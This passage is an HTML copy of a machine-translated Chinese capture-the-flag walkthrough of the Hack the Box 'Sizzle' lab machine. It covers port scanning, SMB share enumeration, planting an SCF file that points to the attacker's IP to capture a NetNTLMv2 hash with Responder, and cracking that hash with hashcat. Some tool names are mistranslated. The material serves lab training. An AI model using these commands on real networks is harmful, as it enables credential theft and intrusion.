<html>
<head>
<title>Hack the Box — Sizzle Write-up</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">黑盒子——Sizzle报道</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/hack-the-box-sizzle-write-up-62f3464701be?source=collection_archive---------0-----------------------#2020-07-15">https://infosecwriteups.com/hack-the-box-sizzle-write-up-62f3464701be?source=collection_archive---------0-----------------------#2020-07-15</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div class="gh gi jn"><img src="../Images/afe55d6b506e2a081f44b39338ceb120.png" data-original-src="https://miro.medium.com/v2/resize:fit:948/format:webp/1*--fg4S_7d-iGpSc1MVltig.png"/></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated">https://www.hackthebox.eu/home/machines/profile/169<a class="ae jy" href="https://www.hackthebox.eu/home/machines/profile/169" rel="noopener ugc nofollow" target="_blank"/></figcaption></figure><p id="031f" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">Sizzle是来自<a class="ae jy" href="https://www.hackthebox.eu/" rel="noopener ugc nofollow" target="_blank"> Hack the Box </a>的疯狂难度机器，由<a class="ae jy" href="https://www.hackthebox.eu/home/users/profile/2984" rel="noopener ugc nofollow" target="_blank"> mrb3n </a>和<a class="ae jy" href="https://www.hackthebox.eu/home/users/profile/709" rel="noopener ugc nofollow" target="_blank"> lkys37en </a>创建，他们是目前可用的Hack the Box Pro实验室中三分之二的作者。</p><p id="101d" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">Sizzle是一款相当旧的机器，因为它是在2019年1月发布的。我决定在这个盒子上工作，因为我最近在近一个月前完成了Hack the Box ' s Offshore(mrb3n的Pro Lab ),我想检查一下我解决这个问题有多舒服。我不会解释在我的<a class="ae jy" href="https://link.medium.com/kn9nOEK587" rel="noopener">森林文章</a>中已经解释过的概念/技术。你可以参考那篇文章了解详情。</p><p id="92c4" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">总结一下解决箱子问题的步骤:</p><h2 id="30df" class="kx ky iq bd kz la lb dn lc ld le dp lf kk lg lh li ko lj lk ll ks lm ln lo lp bi translated">初始立足点:</h2><ul class=""><li id="86f4" class="lq lr iq kb b kc ls kg lt kk lu ko lv ks lw kw lx ly lz ma bi translated">识别充斥着误导信息的可写份额</li><li id="b26b" class="lq lr iq kb b kc mb kg mc kk md ko me ks mf kw lx ly lz ma bi translated">放下。scf文件收集NetNTLMv2哈希，然后破解它</li><li id="e70a" class="lq lr iq kb b kc mb kg mc kk md ko me ks mf kw lx ly lz ma bi translated">向AD CS certsrv进行身份验证，并以amanda的身份签署CSR</li><li id="5e6b" class="lq lr iq kb b kc mb kg mc kk md ko me ks mf kw lx ly lz ma bi translated">通过HTTPS PS远程登录</li></ul><h2 id="7fb2" class="kx ky iq bd kz la lb dn lc ld le dp lf kk lg lh li ko lj lk ll ks lm ln lo lp bi translated">阿曼达→ Mrlky</h2><ul class=""><li id="220d" class="lq lr iq kb b kc ls kg lt kk lu ko lv ks lw kw lx ly lz ma bi translated">Kerberoasting</li></ul><h2 id="b048" class="kx ky iq bd kz la lb dn lc ld le dp lf kk lg lh li ko lj lk ll ks lm ln lo lp bi translated">Mrlky →管理员</h2><ul class=""><li id="8cbc" class="lq lr iq kb b kc ls kg lt kk lu ko lv ks lw kw lx ly lz ma bi translated">获取哈希的DCsync</li></ul><p id="c921" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">如果你遇到/执行了这些技术，基本上解决盒子感觉很短。</p><h2 id="fc25" class="kx ky iq bd kz la lb dn lc ld le dp lf kk lg lh li ko lj lk ll ks lm ln lo lp bi translated">使用的工具:</h2><ul class=""><li id="177b" class="lq lr iq kb b kc ls kg lt kk lu ko lv ks lw kw lx ly lz ma bi translated"><a class="ae jy" href="https://github.com/maurosoria/dirsearch" rel="noopener ugc nofollow" target="_blank">目录搜索</a></li><li id="c4df" class="lq lr iq kb b kc mb kg mc kk md ko me ks mf kw lx ly lz ma bi translated"><a class="ae jy" href="https://github.com/ShawnDEvans/smbmap" rel="noopener ugc nofollow" target="_blank"> smbmap </a></li><li id="3c1f" class="lq lr iq kb b kc mb kg mc kk md ko me ks mf kw lx ly lz ma bi translated"><a class="ae jy" href="https://github.com/byt3bl33d3r/CrackMapExec" rel="noopener ugc nofollow" target="_blank"> cme </a></li><li id="a2c7" class="lq lr iq kb b kc mb kg mc kk md ko me ks mf kw lx ly lz ma bi translated"><a class="ae jy" href="https://github.com/SpiderLabs/Responder" rel="noopener ugc nofollow" target="_blank">响应者</a></li><li id="a67b" class="lq lr iq kb b kc mb kg mc kk md ko me ks mf kw lx ly lz ma bi translated">邪恶的温姆</li><li id="9487" class="lq lr iq kb b kc mb kg mc kk md ko me ks mf kw lx ly lz ma bi translated"><a class="ae jy" href="https://github.com/BloodHoundAD/BloodHound" rel="noopener ugc nofollow" target="_blank">警犬</a></li><li id="1c23" class="lq lr iq kb b kc mb kg mc kk md ko me ks mf kw lx ly lz ma bi translated"><a class="ae jy" href="https://github.com/GhostPack/Rubeus" rel="noopener ugc nofollow" target="_blank">发红</a></li><li id="8605" class="lq lr iq kb b kc mb kg mc kk md ko me ks mf kw lx ly lz ma bi translated"><a class="ae jy" href="https://github.com/SecureAuthCorp/impacket" rel="noopener ugc nofollow" target="_blank">撞击</a></li></ul><h2 id="3b2b" class="kx ky iq bd kz la lb dn lc ld le dp lf kk lg lh li ko lj lk ll ks lm ln lo lp bi translated">扫描:</h2><p id="a92f" class="pw-post-body-paragraph jz ka iq kb b kc ls ke kf kg lt ki kj kk mg km kn ko mh kq kr ks mi ku kv kw ij bi translated">我首先运行<code class="fe mj mk ml mm b">masscan</code>来快速识别开放的端口:</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="a17a" class="kx ky iq mm b gy mv mw l mx my">masscan -p1-65535,U:1-65535 10.10.10.103 --rate=1000 -e tun0</span></pre><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi mz"><img src="../Images/ad024b210b5cfdc0099357006b38b17e.png" data-original-src="https://miro.medium.com/v2/resize:fit:736/format:webp/1*Qt6MdmwNwV3EJV53LYqcvQ.png"/></div></figure><p id="2985" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">根据开放的端口，如53，389，636，我可以有把握地假设这个机器是一个Windows服务器，作为域控制器。然后，我继续运行默认的<code class="fe mj mk ml mm b">nmap</code>扫描:</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="92b5" class="kx ky iq mm b gy mv mw l mx my">sudo nmap -sV -sC -oA nmap/initial 10.10.10.103 -vv -n</span></pre><p id="78bc" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后我检查有趣的结果。</p><h2 id="2a63" class="kx ky iq bd kz la lb dn lc ld le dp lf kk lg lh li ko lj lk ll ks lm ln lo lp bi translated">FTP —端口21</h2><p id="fde5" class="pw-post-body-paragraph jz ka iq kb b kc ls ke kf kg lt ki kj kk mg km kn ko mh kq kr ks mi ku kv kw ij bi translated">从nmap结果来看，似乎是<code class="fe mj mk ml mm b">nmap</code>脚本<em class="na"> ftp-anon </em>识别出允许匿名ftp登录。</p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi nb"><img src="../Images/0f48fadb2f24cce7732e46343c69fc2f.png" data-original-src="https://miro.medium.com/v2/resize:fit:988/format:webp/1*jl05MRP0IBmLz8V9TSWoCw.png"/></div></figure><p id="238c" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我连接到ftp服务并检查任何文件，但没有发现任何有趣的东西。</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="f98e" class="kx ky iq mm b gy mv mw l mx my">ftp 10.10.10.103 <br/>Connected to 10.10.10.103.<br/>220 Microsoft FTP Service<br/>Name (10.10.10.103:sif0): anonymous<br/>331 Anonymous access allowed, send identity (e-mail name) as password.<br/>Password:<br/>230 User logged in.<br/>Remote system type is Windows_NT.<br/>ftp&gt; dir<br/>200 PORT command successful.<br/>125 Data connection already open; Transfer starting.<br/>226 Transfer complete.</span></pre><blockquote class="nc nd ne"><p id="878d" class="jz ka na kb b kc kd ke kf kg kh ki kj nf kl km kn ng kp kq kr nh kt ku kv kw ij bi translated">我认为在ftp的RFC上，使用你的电子邮件来跟踪匿名登录是理想的，但这不是必须的。但是基本上任何密码都可以。</p></blockquote><p id="a15b" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">FTP上没什么有趣的。</p><h2 id="59ed" class="kx ky iq bd kz la lb dn lc ld le dp lf kk lg lh li ko lj lk ll ks lm ln lo lp bi translated">HTTP —端口80</h2><p id="ff46" class="pw-post-body-paragraph jz ka iq kb b kc ls ke kf kg lt ki kj kk mg km kn ko mh kq kr ks mi ku kv kw ij bi translated">检查端口80，支持有趣的HTTP方法，但这些方法通常会导致信息泄露或绕过身份验证。但由于它的IIS 10，我没有检查了。</p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi ni"><img src="../Images/b7aaca3821a0e46c32a878c65141666e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1140/format:webp/1*sLi_ryVWzhbMpG-B1q7ISw.png"/></div></figure><p id="8e48" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">查看网页时，我看到了一张熏肉正在热炒的GIF图片？</p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi nj"><img src="../Images/9725c5dad5bf7a9780b1c0a4d2ff6031.png" data-original-src="https://miro.medium.com/v2/resize:fit:1064/format:webp/1*17cjHeXhzNDlgwqkEJd3gQ.png"/></div></figure><p id="dc48" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后，我使用dirsearch运行了一个目录暴力:</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="1da4" class="kx ky iq mm b gy mv mw l mx my">dirsearch.py -u <a class="ae jy" href="https://10.10.10.103/" rel="noopener ugc nofollow" target="_blank">https://10.10.10.103/</a> -e aspx,txt</span></pre><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi nk"><img src="../Images/edc80093f83fa285692fc4bbce8c7bc7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1328/format:webp/1*MRqeHqyMcI_YuQ9c647n5A.png"/></div></figure><p id="5c6e" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">有趣的目录是/certsrv和/certenroll。/certsrv更有趣，因为状态代码是401(这意味着我们未经授权，通常表示必须有HTTP auth)。我继续列举Windows端口。</p><h2 id="dc12" class="kx ky iq bd kz la lb dn lc ld le dp lf kk lg lh li ko lj lk ll ks lm ln lo lp bi translated">RPC、Netbios、Ldap —端口135、139、389</h2><p id="045c" class="pw-post-body-paragraph jz ka iq kb b kc ls ke kf kg lt ki kj kk mg km kn ko mh kq kr ks mi ku kv kw ij bi translated">这些通常允许空会话(不需要用户和密码)，最终导致对象(用户、计算机等)的枚举。)在域中。</p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi nl"><img src="../Images/52b84a7bdfc26d4e04fb37f60b66cd32.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Pt2KIArAR2SoUX1XbWY7Fg.png"/></div></div></figure><p id="6794" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">值得注意的是，端口389为我提供了一个证书。</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="645e" class="kx ky iq mm b gy mv mw l mx my">ssl-cert: Subject: commonName=sizzle.HTB.LOCAL                                                                                                                               <br/>| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL                                                                                                      <br/>| Issuer: commonName=HTB-SIZZLE-CA/domainComponent=HTB                                                                                                                         <br/>| Public Key type: rsa                                                                                                                                                         <br/>| Public Key bits: 2048                                                                                                                                                        <br/>| Signature Algorithm: sha256WithRSAEncryption                                                                                                                                 <br/>| Not valid before: 2020-07-14T05:50:14                                                                                                                                        <br/>| Not valid after:  2021-07-14T05:50:14                                                                                                                                        <br/>| MD5:   bd32 c0f4 6546 7f24 8e28 e47d 55e4 c192                                                                                                                               <br/>| SHA-1: 17ea 3a28 8d36 9a5a 7498 3393 d5ac 8013 9d76 70af</span></pre><p id="24ec" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">所以DNS域名最有可能是HTB.LOCAL。然后我在<code class="fe mj mk ml mm b">ldapsearch</code>上尝试命令并使用<code class="fe mj mk ml mm b">ldapdomaindump</code>，但是没有给出新的信息。</p><h2 id="54f8" class="kx ky iq bd kz la lb dn lc ld le dp lf kk lg lh li ko lj lk ll ks lm ln lo lp bi translated">HTTPS—443端口</h2><p id="a7c2" class="pw-post-body-paragraph jz ka iq kb b kc ls ke kf kg lt ki kj kk mg km kn ko mh kq kr ks mi ku kv kw ij bi translated">在检查443的结果时，我没有发现任何有趣的东西。</p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi nq"><img src="../Images/66b326bb5d907c38036655ccbc7db5a7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1146/format:webp/1*RPYSO_9zfoesSnjV0VHhYA.png"/></div></figure><h2 id="1944" class="kx ky iq bd kz la lb dn lc ld le dp lf kk lg lh li ko lj lk ll ks lm ln lo lp bi translated">SMB —端口445</h2><p id="d250" class="pw-post-body-paragraph jz ka iq kb b kc ls ke kf kg lt ki kj kk mg km kn ko mh kq kr ks mi ku kv kw ij bi translated">然后，我开始为SMB枚举。我首先使用<code class="fe mj mk ml mm b">smbclient</code>通过空会话列出股票:</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="3f1d" class="kx ky iq mm b gy mv mw l mx my">smbclient -L 10.10.10.103</span></pre><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi nr"><img src="../Images/cf04d7ebaad80ca18031568f9504cfe4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1238/format:webp/1*1zQXF4xIyLNOk5GTG5Im4w.png"/></div></figure><p id="8997" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">有趣的股份有<em class="na"> CertEnroll、部门股份、运营</em>。ADMIN$、C$、NETLOGIN和SYSVOL共享是Windows上的内置共享，因此在结果中包含它们是很常见的。然后我使用<code class="fe mj mk ml mm b">smbmap</code>来检查一个未经认证的用户拥有什么权利:</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="3dbb" class="kx ky iq mm b gy mv mw l mx my">/opt/smbmap/smbmap.py -H 10.10.10.103 -u '' -p ''</span></pre><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi ns"><img src="../Images/f5d2acbe95d94ba35d772b785dc4b34c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XJgMutMjw83EUvuHrRs_nA.png"/></div></div></figure><p id="fd51" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">可悲的是，我什么也没得到。然后我去了<code class="fe mj mk ml mm b">Crackmapexec(cme)</code>上市。</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="1a33" class="kx ky iq mm b gy mv mw l mx my">/opt/cme smb 10.10.10.103 --shares</span><span id="13fc" class="kx ky iq mm b gy nt mw l mx my">SMB         10.10.10.103    445    SIZZLE           [-] Error enumerating shares: SMB SessionError: STATUS_USER_SESSION_DELETED(The remote user session has been deleted.)</span></pre><p id="b8e3" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我得到一个错误。好像不能用<code class="fe mj mk ml mm b">smbmap</code>和<code class="fe mj mk ml mm b">cme</code>上市股票，决定用<code class="fe mj mk ml mm b">smbclient</code>手动做。使用<code class="fe mj mk ml mm b">smbclient</code>检查<em class="na">操作</em>共享，我试图使用<code class="fe mj mk ml mm b">dir</code>命令列出里面的内容，但是访问被拒绝:</p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi nu"><img src="../Images/e31037d04613dbc764e5e08b893c7a88.png" data-original-src="https://miro.medium.com/v2/resize:fit:1384/format:webp/1*kj4XdlGNNF0NUHe7h2SeiQ.png"/></div></figure><p id="bd5c" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后我连接到<em class="na">部门共享</em>共享，并列出里面的内容:</p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi nv"><img src="../Images/2fd097f5f2e28a97f16b1b66d5b4a7a3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Nr_RJ6bkqIXECWY4Poxi6w.png"/></div></div></figure><p id="6a65" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">有意思。很多目录。我可以在<code class="fe mj mk ml mm b">smbclient</code>提示符下使用<code class="fe mj mk ml mm b">recurse</code>递归地列出目录。可能的用户列表如下:</p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi nw"><img src="../Images/25b54d899e24a82a46851900a41c9b8a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1230/format:webp/1*vUrArBpHzTCO9hzQGbzcag.png"/></div></figure><p id="9537" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">HR下的目录:</p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi nx"><img src="../Images/be6afec24b172798bf2cdb7339668725.png" data-original-src="https://miro.medium.com/v2/resize:fit:1224/format:webp/1*ja2660EX_624psDXKYg1Fw.png"/></div></figure><p id="c7ac" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">税收下的目录:</p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi ny"><img src="../Images/cede4ded0ee09f3a3a35312bc5ad0409.png" data-original-src="https://miro.medium.com/v2/resize:fit:1236/format:webp/1*r08O-PH3mpvyigXqJv_WMg.png"/></div></figure><p id="0da3" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">\ZZ_ARCHIVE下的目录:</p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi nz"><img src="../Images/a684539ebefb85f13e91d7170e6e4426.png" data-original-src="https://miro.medium.com/v2/resize:fit:1260/format:webp/1*gqz9iE8zp0IUGg71F1YKxQ.png"/></div></figure><p id="5eb6" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated"><em class="na"> \ZZ_ARCHIVE </em>目录下好像有很多文件。值得注意的是，文件大小和创建时间是相同的。然后我在我的本地机器上下载了随机文件来检查它们的内容。</p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi oa"><img src="../Images/677ec7588a44dfca2324f28eff839b2d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*oTdWMoXCxsn7H_Xt4tW45A.png"/></div></div></figure><p id="1289" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后我对这些文件运行<code class="fe mj mk ml mm b">md5sum</code>,发现它们有相似的散列。</p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi ob"><img src="../Images/aca84e61e863c5261afc96e74e84a7f7.png" data-original-src="https://miro.medium.com/v2/resize:fit:864/format:webp/1*8qwxUyGDkfhgg_QWrZQSjA.png"/></div></figure><p id="c13b" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后我决定下载共享上的所有文件(不支持opsec！)来识别是否有一个不同的文件。</p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi oc"><img src="../Images/10f470a37983794e012756e37423aa0f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Mu1lsxbMlEmSc45ToqF3qA.png"/></div></div></figure><p id="7bc0" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated"><code class="fe mj mk ml mm b">-D</code>标志设置共享下的当前工作目录。<code class="fe mj mk ml mm b">-c</code>标志是<code class="fe mj mk ml mm b">smbclient</code>命令，将在您使用<code class="fe mj mk ml mm b">-D</code>标志设置的目录上执行。</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="b6da" class="kx ky iq mm b gy mv mw l mx my">smbclient -D "\ZZ_ARCHIVE" -c "dir;prompt;mget *" "\\\\10.10.10.103\\Department Shares"</span></pre><p id="2eb9" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后，我还监视目录并计算它们的md5:</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="6e7b" class="kx ky iq mm b gy mv mw l mx my">watch -n 1 "echo;md5sum *"</span></pre><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi od"><img src="../Images/db11c59d12517357dd4947a87824b38a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*49Sxs41qJIKRPY8ZyJ3qXg.png"/></div></div></figure><p id="a68c" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">下载完所有文件后，所有的散列都是相同的。我认为这是一个死胡同。然后我继续回到HTTP上找到的有趣的目录。</p><p id="fe4f" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">搜索<code class="fe mj mk ml mm b">/certsrv</code>会让你看到各种各样的文章。除了微软的文档之外，我找到的一篇好文章是这样的。检查<code class="fe mj mk ml mm b">/certsrv </code>目录:</p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi oe"><img src="../Images/a7da64bdf029a9b24847551ec3f2ce0e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2kLQPNO8nUQiS2FEXqGwUg.png"/></div></div></figure><p id="899b" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我得到一个HTTP认证提示。然后我尝试了常见的默认组合，如<code class="fe mj mk ml mm b">admin:admin</code>和<code class="fe mj mk ml mm b">admin:password</code>，并使用Burp拦截了它。</p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi of"><img src="../Images/024bb2f99d57217cd86e0473af1bf87b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1110/format:webp/1*XzbNotp6B1E97gT3KgCCeQ.png"/></div></figure><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi og"><img src="../Images/80ec0b420987d4eee655aed0d7c02a2d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1160/format:webp/1*5jd3yJsGnFfKd1XPGCK6ug.png"/></div></figure><p id="8a43" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">有趣的是授权是NTLM。我还认为这里的工作凭证很可能是域用户的同一个登录。然后，我返回到<em class="na">部门共享</em>共享下的<em class="na">用户</em>目录，并注意到有一个公共目录，该目录的最后一次文件写入日期不同。然后，我尝试上传一个名为<code class="fe mj mk ml mm b">test.txt</code>的虚拟文件，上传成功:</p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi oh"><img src="../Images/61fc59ec41a4d0d612709c6ef9ee7651.png" data-original-src="https://miro.medium.com/v2/resize:fit:1278/format:webp/1*oauzxNj8LGab_k-A-dL77A.png"/></div></figure><p id="3d8d" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后我创建了一个Bash一行程序，它将在每个目录上上传<code class="fe mj mk ml mm b">test.txt</code>文件并列出其内容。</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="72ee" class="kx ky iq mm b gy mv mw l mx my">for user in $(cat users.txt); do smbclient -D "\Users" -N -c "prompt; cd $user; put test.txt; dir" "\\\\10.10.10.103\\Department Shares"; done</span></pre><p id="4288" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">除了公共目录，我没有其他目录可以上传。</p><h2 id="3453" class="kx ky iq bd kz la lb dn lc ld le dp lf kk lg lh li ko lj lk ll ks lm ln lo lp bi translated">SCF获取NetNTLMv2:</h2><p id="f29d" class="pw-post-body-paragraph jz ka iq kb b kc ls ke kf kg lt ki kj kk mg km kn ko mh kq kr ks mi ku kv kw ij bi translated">知道我可以上传文件到一个共享位置，这在HTB是一个经常发生的情况，然后我试着上传一个<code class="fe mj mk ml mm b">SCF</code> (Shell命令文件),其中包含一个到我的IP地址的路径。一旦用户点击了<code class="fe mj mk ml mm b">SCF</code>文件，SIZZLE machine将被认证为“点击”SCF文件的用户。我不会深究技术细节，但是<code class="fe mj mk ml mm b">challenge-respons</code>场景包括一个由用户密码加密的随机数。然后，我们可以捕获这些信息，并破解散列来获得用户的密码。SCF文件的内容:</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="4622" class="kx ky iq mm b gy mv mw l mx my">[Shell]<br/>Command=2<br/>Iconfile=\\10.10.14.3\sifo\doesntmatter<br/>[Taskbar]<br/>Command=ToggleDesktop</span></pre><p id="f24e" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后我运行<code class="fe mj mk ml mm b">responder</code>，这是一个监听连接和捕获认证请求的工具。我将其设置为在tun0接口上监听:</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="2abd" class="kx ky iq mm b gy mv mw l mx my">responder -I tun0 </span></pre><p id="4d2a" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后我把名为<code class="fe mj mk ml mm b">@sifo.scf</code>的文件放在共享上。</p><blockquote class="nc nd ne"><p id="b437" class="jz ka na kb b kc kd ke kf kg kh ki kj nf kl km kn ng kp kq kr nh kt ku kv kw ij bi translated">我添加了“@”，因为这将在打开时将文件放在窗口/文件资源管理器列表的顶部。</p></blockquote><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi oi"><img src="../Images/08ac9a2d759945250d36d77b2b0ae12e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*dYLW5DKHUd0lgsDyU6wMDg.png"/></div></div></figure><p id="6bb3" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">过了一会儿，我从<code class="fe mj mk ml mm b">HTB\amanda.</code>得到一个连接，然后我可以把散列放在一个文件上，用<code class="fe mj mk ml mm b">hashcat</code>使用rockyou作为单词表来破解它。大多数时候，在Hack the Box机器中找到的散列使用rockyou是“可破解的”。<code class="fe mj mk ml mm b">-m 5600</code>标志对应NetNTLMv2。</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="ae87" class="kx ky iq mm b gy mv mw l mx my">hashcat -m 5600 amanda.netntlmv2 /usr/share/wordlists/rockyou.txt --force</span></pre><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi oj"><img src="../Images/ef23d9896fa5c2e8fc04a74183e30ef9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1320/format:webp/1*Zf8P60H-hQ3FywDr-P3mdg.png"/></div></figure><p id="c6cc" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt 